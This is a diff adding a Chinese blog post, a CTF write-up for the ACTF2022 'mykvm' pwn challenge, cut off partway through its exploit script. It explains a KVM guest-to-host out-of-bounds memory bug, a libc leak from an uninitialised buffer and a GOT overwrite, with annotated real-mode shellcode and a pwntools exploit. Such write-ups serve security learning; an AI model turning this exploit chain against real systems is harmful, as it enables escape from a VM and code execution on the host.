@@ -1,0 +1,427 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="练习题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF2022 pwn mykvm题解">
+<meta property="og:url" content="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-mykvm/index.html">
+<meta property="og:site_name" content="blingbling&#39;s blog">
+<meta property="og:description" content="练习题">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-01T08:24:26.000Z">
+<meta property="article:modified_time" content="2022-07-01T09:27:13.471Z">
+<meta property="article:author" content="blingbling">
+<meta property="article:tag" content="kvm">
+<meta name="twitter:card" content="summary"><title>ACTF2022 pwn mykvm题解 | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2022/07/01/ACTF2022-pwn-mykvm/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: true,
+  zoomImage: undefined,
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-feather-alt"></i></span><span class="header-nav-menu-item__text">文章</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/archives/"><span class="header-nav-submenu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-submenu-item__text">归档</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/categories/"><span class="header-nav-submenu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-submenu-item__text">分类</span></a></div><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/tags/"><span class="header-nav-submenu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-submenu-item__text">标签</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-fingerprint"></i></span><span class="header-nav-menu-item__text">关于</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/author/"><span class="header-nav-submenu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-submenu-item__text">作者</span></a></div></div></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="javascript:;" onclick="return false;"><span class="header-nav-menu-item__icon"><i class="fas fa-angle-double-down"></i></span><span class="header-nav-menu-item__text">其他</span></a><div class="header-nav-submenu"><div class="header-nav-submenu-item"><a class="header-nav-submenu-item__link" href="/friends/"><span class="header-nav-submenu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-submenu-item__text">友链</span></a></div></div></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">blingbling's blog</div><div class="header-banner-info__subtitle">Clang鱼塘</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">ACTF2022 pwn mykvm题解</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-07-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-07-01</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><ul>
+<li>题目描述：KVM is funny, enjoy it!</li>
+<li>题目附件：<a href="mykvm.zip">mykvm.zip</a></li>
+</ul>
+
+        <h1 id="分析"   >
+          <a href="#分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#分析" class="headerlink" title="分析"></a>分析</h1>
+      <p>先看一下main函数中的代码逻辑，</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;your code size: &quot;</span>);			<span class="comment">//待输入code的大小</span></span><br><span class="line"> __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, nbytes);</span><br><span class="line"> <span class="keyword">if</span> ( nbytes[<span class="number">0</span>] &lt;= <span class="number">0x1000</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;your code: &quot;</span>);			<span class="comment">//输入准备好的code，将在kvm虚拟机中运行</span></span><br><span class="line">   read(<span class="number">0</span>, buf, nbytes[<span class="number">0</span>]);</span><br><span class="line">   *(_QWORD *)&amp;nbytes[<span class="number">1</span>] = sub_400F28((__int64)<span class="string">&quot;guest name: &quot;</span>);		</span><br><span class="line">   *(_QWORD *)&amp;nbytes[<span class="number">1</span>] = sub_400F28((__int64)<span class="string">&quot;guest passwd: &quot;</span>);	</span><br><span class="line">   sub_400B92(buf, nbytes[<span class="number">0</span>]);			<span class="comment">//函数内部通过ioctl调用实现kvm虚拟机执行上面输入的code并返回</span></span><br><span class="line">   *(_QWORD *)&amp;nbytes[<span class="number">1</span>] = sub_400F28((__int64)<span class="string">&quot;host name: &quot;</span>);		</span><br><span class="line">   <span class="built_in">memcpy</span>(dest, *(<span class="keyword">const</span> <span class="keyword">void</span> **)&amp;nbytes[<span class="number">1</span>], <span class="number">0x20</span>uLL);	</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br></pre></td></tr></table></div></figure>
+<p>做题之前并没有研究过KVM的机制，于是搜了一下跟kvm相关的ctf题，发现了这一篇：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254790" >Confidence2020 CTF KVM</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。按照这个题目中的漏洞点，很快在mykvm中也找到了类似漏洞。如下，sub_400B92()函数中memory_size的值设置的相当大，于是我们能在kvm虚拟机中越界访问到host机的内存。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v8.slot = <span class="number">0</span>;</span><br><span class="line">v8.flags = <span class="number">0</span>;</span><br><span class="line">v8.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">v8.memory_size = <span class="number">0x40000000</span>LL;</span><br><span class="line">v8.userspace_addr = (<span class="keyword">int</span>)((_DWORD)&amp;unk_602100</span><br><span class="line">                        - (((((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">int</span>)&amp;unk_602100 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">20</span>) + (<span class="keyword">unsigned</span> __int16)&amp;unk_602100) &amp; <span class="number">0xFFF</span>)</span><br><span class="line">                         - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">int</span>)&amp;unk_602100 &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">20</span>))</span><br><span class="line">                        + <span class="number">4096</span>);</span><br><span class="line">ioctl(v4, <span class="number">0x4020AE46</span>uLL, &amp;v8);</span><br></pre></td></tr></table></div></figure>
+<p>不过，unk_602100在bss段，在kvm虚拟机中我们只能往后访问，即可能访问到host进程的堆空间。同时，该题对kvm虚拟机的设置，要求我们的代码从实模式开始运行。因此，要么我们在实模式有限的访存空间（1M）下进行利用，要么想办法进入保护模式进行利用。</p>
+<p>由于对实模式和保护模式的切换以及页表的设置不熟，且堆的地址范围在一定概率下会跟kvm能访问的空间（1M）有重合，于是我们就直接在实模式下完成了对该题的利用。</p>
+
+        <h2 id="越界能做什么？"   >
+          <a href="#越界能做什么？" class="heading-link"><i class="fas fa-link"></i></a><a href="#越界能做什么？" class="headerlink" title="越界能做什么？"></a>越界能做什么？</h2>
+      <p>首先，在bss段的最后，有一个指针变量，是<code>memcpy(dest, *(const void **)&amp;nbytes[1], 0x20uLL);</code>的目的地址，也就是说我们能写host进程空间的任意地址，长度为0x20。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602100 unk_602100      db    ? ;               ; DATA XREF: sub_400B92+8C↑o</span><br><span class="line">.bss:0000000000602100                                         ; sub_400B92+93↑o</span><br><span class="line">.bss:0000000000602101                 db    ? ;</span><br><span class="line">.bss:0000000000602102                 db    ? ;</span><br><span class="line">.bss:0000000000602103                 db    ? ;</span><br><span class="line">.bss:0000000000602104                 db    ? ;</span><br><span class="line">.............</span><br><span class="line">.bss:000000000060A100 ; void *dest</span><br><span class="line">.bss:000000000060A100 dest            dq ?                    ; DATA XREF: main+7E↑w</span><br><span class="line">.bss:000000000060A100                                         ; main+85↑r ...</span><br><span class="line">.bss:000000000060A100 _bss            ends</span><br></pre></td></tr></table></div></figure>
+<p>然后，再往后写就是host进程的堆空间了，这部分需要动态调试查看其内容，找到对我们有用的部分。</p>
+<p>（调试过程省略，该环境使用的lib版本较低，是libc2.23，存在fastbin）</p>
+<ul>
+<li><p>在堆空间中有一些libc的地址，利用这个可以在code中计算libc基址。</p>
+</li>
+<li><p>我发现，如果”guest name: “，”guest passwd: “和”host name: “都输入相同长度字符串”xxxx”时，三者分配的是同一个chunk。且chunk的后8个字节存着一个固定的libc地址。</p>
+</li>
+</ul>
+
+        <h2 id="错位写入"   >
+          <a href="#错位写入" class="heading-link"><i class="fas fa-link"></i></a><a href="#错位写入" class="headerlink" title="错位写入"></a>错位写入</h2>
+      <p>通过以上分析，我们具备了如下能力：</p>
+<ul>
+<li><p>任意地址写（目的地址可控，写入内容可控，长度为0x20）</p>
+</li>
+<li><p>已知libc基址</p>
+</li>
+</ul>
+<p>所以，我们可以覆写host进程的got表，将<code>puts(&quot;Bye!&quot;)</code>打印劫持成执行一段gadget。</p>
+<p>但是，由于<code>memcpy(dest, *(const void **)&amp;nbytes[1], 0x20uLL);</code>中nbytes[1]的第一个字节一定会被我们的输入覆盖，所以如果将dest地址改成puts@got的话，无法写成目标gadget地址。幸好我们能写0x20大小的内容，因此通过错位写入，就能达到目的。</p>
+<p>ps. 由于泄露的libc地址是保存在shellcode的执行环境中的，并未泄露给我们，因此需要在我们的shellcode中将gadget地址写到nbytes[1]对应的堆块中。这样也能达到hook got表项的目的。</p>
+
+        <h2 id="其他"   >
+          <a href="#其他" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他" class="headerlink" title="其他"></a>其他</h2>
+      <p>做题过程中发现的一些认为重要的点。</p>
+
+        <h3 id="buf未初始化"   >
+          <a href="#buf未初始化" class="heading-link"><i class="fas fa-link"></i></a><a href="#buf未初始化" class="headerlink" title="buf未初始化"></a>buf未初始化</h3>
+      <p>main函数中的buf没有初始化，所以我们将<code>&quot;your code size: </code>“的大小设置为最大值4096时，栈中残留数据会被带入我们运行的kvm虚拟机可访问空间内。这里面存在libc相关的地址，也是泄露libc基址的一种方法。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD nbytes[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-101Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+10h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line">.......</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your code size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, nbytes);</span><br><span class="line">    <span class="keyword">if</span> ( nbytes[<span class="number">0</span>] &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;your code: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, nbytes[<span class="number">0</span>]);</span><br><span class="line">........</span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h3 id="readline是什么"   >
+          <a href="#readline是什么" class="heading-link"><i class="fas fa-link"></i></a><a href="#readline是什么" class="headerlink" title="readline是什么"></a>readline是什么</h3>
+      <p>sub_400F28()这个函数被调用了三次，两次在kvm执行代码前，一次在kvm执行代码后。这个函数中使用了readline，关于这个函数，简单解释如下。</p>
+<blockquote>
+<p>readline() 的参数是一个字符串，调用函数的时候会在屏幕上输出，这个函数会读取一行输入，然后返回一个指向输入字符串的指针，readline 会为输入的字符串动态分配内存，所以使用完之后需要free掉。——来自<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.51cto.com/u_3078781/3287226" >readline库的简单使用</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">sub_400F28</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)readline(a1);</span><br><span class="line">  <span class="keyword">if</span> ( ptr &amp;&amp; *(_BYTE *)ptr )</span><br><span class="line">    add_history((__int64)ptr);</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>所以这里会使用堆，且堆的大小和内容，我们可控。</p>
+
+        <h1 id="调试"   >
+          <a href="#调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#调试" class="headerlink" title="调试"></a>调试</h1>
+      <p>注意点：</p>
+<ul>
+<li>host需要开启kvm支持</li>
+<li>docker container启动命令需要加<code>--privileged</code>，使docker中能调用到对应的功能</li>
+</ul>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker container run --privileged --rm -p 8000:8888 -p 1234:1234 -d  mykvm:latest</span><br><span class="line">docker container <span class="built_in">exec</span> -it &lt;container-ID&gt; /bin/bash</span><br><span class="line"><span class="comment"># 本地发起一个连接并停住（raw_input(), input()）</span></span><br><span class="line">gdb server :1234 --attach &lt;pid&gt;</span><br><span class="line"><span class="comment"># 本地起gdb连接（target remote :1234）</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+        <h1 id="利用"   >
+          <a href="#利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用" class="headerlink" title="利用"></a>利用</h1>
+      
+        <h2 id="shellcode编写"   >
+          <a href="#shellcode编写" class="heading-link"><i class="fas fa-link"></i></a><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h2>
+      <p>汇编代码详细解释</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">    .code16gcc			; 指明编译的程序是运行在16位x86实模式下的</span><br><span class="line">    jmp main			; 跳转到main处开始运行</span><br><span class="line">    .rept 40</span><br><span class="line">    .byte 0x00</span><br><span class="line">    .endr				; 这三条是为了适配gadget的条件[rsp+0x30]&#x3D;&#x3D;null而准备的</span><br><span class="line">main:</span><br><span class="line">    mov eax,[0x7100]</span><br><span class="line">    sub eax,0x603000</span><br><span class="line">    cmp eax,0xfd800		; 从0x7100（0x60a100）处读取dest中存放的堆地址，判断目标读写堆地址是否在1M空间内</span><br><span class="line">    jb next				; 在1M范围内就进入next继续利用</span><br><span class="line">    mov ebx,0</span><br><span class="line">    div eax,ebx			; 不在1M范围内则通过除零异常重新开始</span><br><span class="line"></span><br><span class="line">next:</span><br><span class="line">    mov ebx,[0x568]		; 由于buf未初始化，当采用0x1000最大长度拷贝时，可以将栈中的地址信息拷贝到kvm虚拟机可访问的内存中，0x568处存放了一个有用地址，通过偏移可以准确计算libc基址</span><br><span class="line">    add ebx,0x2270cf</span><br><span class="line">    mov [0x7200],ebx	; libc基址的低32位保存在0x7200处</span><br><span class="line">    mov ebx,[0x56c]</span><br><span class="line">    mov [0x7204],ebx   	; libc基址的高32位保存在0x7204处</span><br><span class="line"></span><br><span class="line">    mov ebx,[0x7100]	</span><br><span class="line">    add ebx,0x27e0</span><br><span class="line">    mov [0x7220],ebx	; 将目标heap chunk的地址存到0x7220处</span><br><span class="line"></span><br><span class="line">    mov edx,[0x7200]</span><br><span class="line">    add edx,0x4527a		</span><br><span class="line">    push edx			; 计算gadget低4字节的实际地址，暂时保存在栈上</span><br><span class="line">    add ebx,0x8			; 目标heap chunk是0x10字节大小的，前8个字节在readline()时会被覆盖，所以这里使用后8个字节存放gadget的地址</span><br><span class="line">    sub ebx,0x603000	; 换算成kvm虚拟机中可以访问的地址</span><br><span class="line">    mov eax,ebx</span><br><span class="line">    shr eax,16</span><br><span class="line">    shl eax,12</span><br><span class="line">    mov ds,eax			; 由于目标地址有20位，而x86实模式下地址总线只有16位，因此需要借助ds寄存器实现访存操作。</span><br><span class="line">    pop edx</span><br><span class="line">    mov ds:[bx],edx		; 把gadget的低4个字节拷贝到了目标堆块对应位置，由于堆块中正好有libc的高4字节信息，省了一次拷贝操作</span><br><span class="line"></span><br><span class="line">    mov ebx,0x602020</span><br><span class="line">    mov eax,0			; 将ds寄存器清空，因为接下来要访问的地址不超过16位</span><br><span class="line">    mov ds,eax</span><br><span class="line">    mov [0x7100],ebx	; 将dest存放的内容改成got表项（putchar）地址，以达到错位将puts的got表项改成了gadget地址的目的</span><br><span class="line"></span><br><span class="line">    hlt					; hlt指令跟除零异常的返回不一样，便于在python脚本中区分</span><br></pre></td></tr></table></div></figure>
+<p>在写shellcode时，由于对x86实模式下的汇编规则不熟，遇到些坑点。如：</p>
+<ul>
+<li>eax用于访存和add指令相关的操作时无法正常工作</li>
+<li>ds寄存器的设置与取消</li>
+<li>edx中存放的值间隔几条指令后可能被清零，而ebx不会</li>
+</ul>
+
+        <h2 id="exp"   >
+          <a href="#exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp" class="headerlink" title="exp"></a>exp</h2>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;20.247.110.192&quot;,10888)</span></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    .code16gcc</span></span><br><span class="line"><span class="string">    jmp main</span></span><br><span class="line"><span class="string">    .byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">    mov eax,[0x7100]</span></span><br><span class="line"><span class="string">    sub eax,0x603000</span></span><br><span class="line"><span class="string">    cmp eax,0xfd800</span></span><br><span class="line"><span class="string">    jb next</span></span><br><span class="line"><span class="string">    mov ebx,0</span></span><br><span class="line"><span class="string">    div eax,ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">next:</span></span><br><span class="line"><span class="string">    mov ebx,[0x568]</span></span><br><span class="line"><span class="string">    add ebx,0x2270cf</span></span><br><span class="line"><span class="string">    mov [0x7200],ebx</span></span><br><span class="line"><span class="string">    mov ebx,[0x56c]</span></span><br><span class="line"><span class="string">    mov [0x7204],ebx   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx,[0x7100]</span></span><br><span class="line"><span class="string">    add ebx,0x27e0</span></span><br><span class="line"><span class="string">    mov [0x7220],ebx	</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx,[0x7200]</span></span><br><span class="line"><span class="string">    add edx,0x4527a</span></span><br><span class="line"><span class="string">    mov [0x7228],edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    add ebx,0x8</span></span><br><span class="line"><span class="string">    sub ebx,0x603000</span></span><br><span class="line"><span class="string">    mov eax,ebx</span></span><br><span class="line"><span class="string">    shr eax,16</span></span><br><span class="line"><span class="string">    shl eax,12</span></span><br><span class="line"><span class="string">    mov ds,eax</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    mov ds:[bx],edx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx,0x602020</span></span><br><span class="line"><span class="string">    mov eax,0</span></span><br><span class="line"><span class="string">    mov ds,eax</span></span><br><span class="line"><span class="string">    mov [0x7100],ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span> </span><br><span class="line"><span class="keyword">while</span> c:</span><br><span class="line">    <span class="comment">#raw_input()    </span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;your code size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4096&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;your code: &quot;</span>)</span><br><span class="line">    io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;guest name: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;guest passwd: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.recvline()</span><br><span class="line">    ret = io.recv(<span class="number">0x1b</span>)</span><br><span class="line">    <span class="keyword">if</span> <span 